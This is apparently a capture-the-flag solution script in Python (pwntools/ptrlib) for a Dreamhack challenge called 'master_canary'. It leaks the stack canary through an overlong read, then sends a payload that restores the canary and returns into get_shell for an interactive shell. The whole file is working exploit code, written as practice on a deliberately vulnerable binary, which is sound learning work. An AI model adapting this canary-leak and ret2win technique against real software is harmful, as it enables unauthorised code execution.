#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./master_canary")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 10847)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.sendlineafter("> ", "1")
    io.sendlineafter("> ", "2")
    input(">> ")
    # io.sendlineafter("Size: ", str(0x89))
    # io.sendlineafter("Data: ", b"A" * (0x89))
    io.sendlineafter("Size: ", str(0x929))
    io.sendlineafter("Data: ", b"A" * (0x929))

    io.recvuntil(b"A" * 0x929)
    canary = ptr.u64(b"\x00" + io.recv(7))
    ptr.logger.info(f"canary: {hex(canary)}")

    payload = b""
    payload += b"A" * 40
    payload += ptr.p64(canary)
    payload = payload.ljust(56, b"A")
    # payload += b"A" * 8
    payload += ptr.p64(next(exe.gadget("ret;")))
    payload += ptr.p64(unwrap(exe.symbol("get_shell")))

    io.sendlineafter("> ", "3")
    input(">> ")
    io.sendlineafter("Leave comment: ", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
